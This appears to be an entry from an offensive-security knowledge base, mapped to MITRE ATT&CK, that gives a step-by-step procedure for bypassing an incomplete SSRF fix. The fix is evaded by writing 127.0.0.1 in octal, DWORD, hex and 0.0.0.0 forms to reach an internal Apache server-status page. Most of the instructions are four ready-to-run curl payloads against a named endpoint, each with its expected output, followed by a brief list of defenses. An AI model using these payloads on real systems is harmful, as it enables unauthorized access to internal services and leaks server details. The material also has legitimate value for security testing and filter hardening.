---
tags:
  - ssrf
  - bypass
  - ip-encoding
  - apache
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-ip-bypass-octal]]'
  - '[[commands/curl-ssrf-ip-bypass-dword]]'
  - '[[commands/curl-ssrf-ip-bypass-hex]]'
  - '[[commands/curl-ssrf-ip-bypass-any]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.451Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 79c80f45-0d88-4501-80f6-c21c512ed567
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-SSRF-Fix-Using-IP-Encodings

## Summary

This procedure bypasses SSRF mitigations that blacklist common internal IPs by using octal, hexadecimal, DWORD, and ANY_IP encodings to access the Apache server-status page and reveal version details.

## Description

After patching to block 127.0.0.1, localhost, and 169.254.169.254, attackers can use IP representations like octal (0177.0000000000001), decimal DWORD (2130706433), hex (0x7f000001), or 0.0.0.0 to evade filters. This targets http://<encoded>:8081/server-status, exposing Apache/2.2.15 with modules like PHP/5.4.36 and OpenSSL/1.0.0-fips.

## Requirements

1. Initial SSRF fixed but incompletely (string-based blocks)
2. Knowledge of IP encoding formats
3. Access to vulnerable form

## Defense

Defensive measures and detection strategies:

- Normalize and validate all IP formats before processing (convert to canonical form)
- Block all private/reserved IPs regardless of encoding
- Implement comprehensive URL parsing libraries with built-in SSRF protection

## Objectives

1. Evade IP blacklisting
2. Access internal Apache status
3. Leak server stack versions

## Instructions

### Step 1: Octal Encoding Bypass

**Context**: Use octal notation for 127.0.0.1 to bypass string filters.

**Command** ([[commands/curl-ssrf-ip-bypass-octal]]):
```bash
curl -X POST -d 'url=http://0177.0000000000001:8081/server-status' https://www.apitest.io/request
```

> Returns Apache server-status with version and module details.

### Step 2: DWORD Encoding Bypass

**Context**: Represent IP as 32-bit decimal integer.

**Command** ([[commands/curl-ssrf-ip-bypass-dword]]):
```bash
curl -X POST -d 'url=http://2130706433:8081/server-status' https://www.apitest.io/request
```

> Same Apache output, confirming bypass.

### Step 3: Hexadecimal Encoding

**Context**: Use hex for IP to evade detection.

**Command** ([[commands/curl-ssrf-ip-bypass-hex]]):
```bash
curl -X POST -d 'url=http://0x7f000001:8081/server-status' https://www.apitest.io/request
```

> Exposes server details.

### Step 4: ANY_IP Bypass

**Context**: Target 0.0.0.0 as a wildcard for local access.

**Command** ([[commands/curl-ssrf-ip-bypass-any]]):
```bash
curl -X POST -d 'url=http://0.0.0.0:8081/server-status' https://www.apitest.io/request
```

> Retrieves Apache status page.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-ip-bypass-octal]]
- [[commands/curl-ssrf-ip-bypass-dword]]
- [[commands/curl-ssrf-ip-bypass-hex]]
- [[commands/curl-ssrf-ip-bypass-any]]

## Tools Used


## Tags

- ssrf
- bypass
- ip-encoding
- apache
